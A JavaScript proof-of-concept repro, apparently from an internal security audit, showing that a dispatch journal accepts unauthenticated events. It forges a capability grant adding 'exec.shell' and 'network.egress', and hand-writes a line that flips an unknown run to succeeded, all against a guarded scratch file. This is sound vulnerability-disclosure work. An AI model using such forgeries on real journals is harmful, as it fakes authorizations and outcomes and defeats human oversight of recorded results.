/**
 * B9: JOURNAL WRITE-AUTHORITY FORGERY (capability forgery + result forgery).
 *
 * Threat: the MC dispatch journal is a shared file. NOTHING authenticates
 * journal writers: loadJournalEvents() accepts any JSON line with an
 * event_id (no event-type allowlist, no event_id verification, no
 * signature/MAC), and the projector applies MC_AGENT_AUTHORIZED /
 * MC_RUN_SUCCEEDED on pure claim (projector: capabilities_granted =
 * d.capabilities_granted, no adapter binding).
 *
 * This repro uses the REAL journal semantics (B4's scratch copy of
 * mc-dispatch.ts at HEAD 0264d517: real appendDispatchEvent, mintEventId,
 * loadJournalEvents, projectMissions) against a scratch journal, and shows:
 *   A. A second MC_AGENT_AUTHORIZED with a divergent summary is APPENDED
 *      (dedupe key is kind|missionId|eventType|summary only) and the
 *      projector adopts the forged capabilities_granted + work_order_id.
 *   B. A raw hand-written JSON line (no API at all, random event_id) is
 *      loaded and projected: UNKNOWN -> SUCCEEDED with a forged
 *      output_digest, reconciliation_state cleared, no marker.
 *
 * Verdict: file write access == authority to grant capabilities and to
 * decide mission outcomes. The only defense is OS file permissions; there
 * is no cryptographic or capability binding between an authority event and
 * the adapter that supposedly made the decision.
 *
 * Safety: scratch journal only (guard below refuses anything else).
 * Run: MC_SCRATCH_JOURNAL=$PWD/events.jsonl node b9-journal-authority-forgery.mjs
 */
import { appendFileSync, existsSync, readFileSync, mkdirSync } from 'fs';
import { join, resolve } from 'path';

const HERE = new URL('.', import.meta.url).pathname;
const J = process.env.MC_SCRATCH_JOURNAL || '';
if (!J || !resolve(J).startsWith(resolve(HERE))) {
  throw new Error('REFUSING: MC_SCRATCH_JOURNAL must be set inside ' + HERE);
}
mkdirSync(join(HERE), { recursive: true });

const lib = await import('./mc-dispatch.scratch.ts');
const { appendDispatchEvent, loadJournalEvents, projectMissions, mintEventId, JOURNAL_PATH } = lib;
if (!resolve(JOURNAL_PATH).startsWith(resolve(HERE))) {
  throw new Error('REFUSING: lib JOURNAL_PATH escaped scratch: ' + JOURNAL_PATH);
}

const MID = 'mc-m-b9-forge-01';
const proj = () => projectMissions(loadJournalEvents()).find(m => m.mission_id === MID);
const lines = () => existsSync(JOURNAL_PATH) ? readFileSync(JOURNAL_PATH, 'utf8').split('\n').filter(l => l.trim()).length : 0;

console.log('journal:', JOURNAL_PATH);

// Phase 1: legitimate lifecycle with a narrow grant.
appendDispatchEvent('MC_MISSION_CREATED', MID, `mission created: ${MID}`, { run_id: MID + '-r1', execution_id: MID + '-x1', agent: 'ollama', tenant: 'happy-place', capability: 'text.summarize', prompt_digest: 'pd1' });
appendDispatchEvent('MC_RUN_QUEUED', MID, `run queued: ${MID}-r1`, { run_id: MID + '-r1', execution_id: MID + '-x1', agent: 'ollama', tenant: 'happy-place', capability: 'text.summarize' });
appendDispatchEvent('MC_EXECUTION_STARTED', MID, `execution started: ${MID}-x1`, { run_id: MID + '-r1', execution_id: MID + '-x1', agent: 'ollama', tenant: 'happy-place', capability: 'text.summarize' });
appendDispatchEvent('MC_AGENT_AUTHORIZED', MID, `agent ollama authorized for text.summarize`,
  { run_id: MID + '-r1', execution_id: MID + '-x1', agent: 'ollama', tenant: 'happy-place', capability: 'text.summarize',
    capabilities_granted: ['text.summarize'], work_order_id: 'wo-legit-001' });
let m = proj();
console.log('\n[legit] capabilities_granted:', JSON.stringify(m.capabilities_granted), '| work_order_id:', m.work_order_id);

// ATTACK A: forged authorization via the real append API (divergent summary -> new event id).
const rA = appendDispatchEvent('MC_AGENT_AUTHORIZED', MID, `agent ollama authorized for text.summarize (reconciled elevation)`,
  { run_id: MID + '-r1', execution_id: MID + '-x1', agent: 'ollama', tenant: 'happy-place', capability: 'text.summarize',
    capabilities_granted: ['text.summarize', 'exec.shell', 'network.egress'], work_order_id: 'wo-FORGED-999' });
m = proj();
const aOk = rA.disposition === 'appended'
  && m.capabilities_granted.includes('exec.shell')
  && m.work_order_id === 'wo-FORGED-999';
console.log(`\n[ATTACK A: capability forgery via append API] disposition=${rA.disposition}`);
console.log('  capabilities_granted now:', JSON.stringify(m.capabilities_granted));
console.log('  work_order_id now:', m.work_order_id);
console.log(`  => ${aOk ? 'FORGERY ACCEPTED: projector adopted forged grant, no adapter check' : 'rejected'}`);

// ATTACK B: raw file forgery, no API. Mission -> UNKNOWN, then a hand-written
// SUCCEEDED line flips it. Event id is random: loadJournalEvents verifies nothing.
appendDispatchEvent('MC_RUN_UNKNOWN', MID, `outcome unknown: simulated timeout`,
  { run_id: MID + '-r1', execution_id: MID + '-x1', agent: 'ollama', tenant: 'happy-place', capability: 'text.summarize',
    reason: 'simulated timeout', reconciliation_state: 'RECONCILIATION IN PROGRESS' });
m = proj();
console.log('\n[pre-B] status:', m.status, '| reconciliation_state:', m.reconciliation_state);
const forgedLine = JSON.stringify({
  event_id: 'mc-d-FORGED' + Math.random().toString(16).slice(2, 10),
  timestamp: new Date(Date.now() + 5000).toISOString(),
  event_type: 'MC_RUN_SUCCEEDED',
  aggregate_id: `mc:mission:${MID}`,
  aggregate_type: 'mc_mission',
  event_data: {
    mission_id: MID, backfill: false, summary: 'run succeeded (late reconciled result)',
    run_id: MID + '-r1', execution_id: MID + '-x1', agent: 'ollama', tenant: 'happy-place',
    capability: 'text.summarize', output_digest: 'sha256:FORGED-NEVER-EXECUTED', output_chars: 12,
  },
});
appendFileSync(JOURNAL_PATH, forgedLine + '\n', 'utf8');
m = proj();
const bOk = m.status === 'SUCCEEDED'
  && m.reconciliation_state !== 'RECONCILIATION IN PROGRESS'
  && JSON.stringify(m.events.map(e => e.event_type)).includes('MC_RUN_SUCCEEDED');
console.log('[ATTACK B: raw-file result forgery] status now:', m.status,
  '| reconciliation_state:', m.reconciliation_state,
  '| outcome:', m.result.outcome);
console.log(`  => ${bOk ? 'FORGERY ACCEPTED: UNKNOWN flipped to SUCCEEDED by a hand-written line, no marker' : 'rejected'}`);

console.log(`\nRESULT: ${aOk && bOk ? 'BOTH FORGERIES ACCEPTED' : 'partial'} (${lines()} journal lines). ` +
  `Write access to the journal file is write access to authority: no signer, no allowlist, ` +
  `no event_id verification at load; dedupe key excludes the payload.`);
console.log('FALSIFIES IF: a deployed writer-authenticity mechanism exists (signed events, ' +
  'append-only via a capability-checked API, projector allowlist of writer identities).');
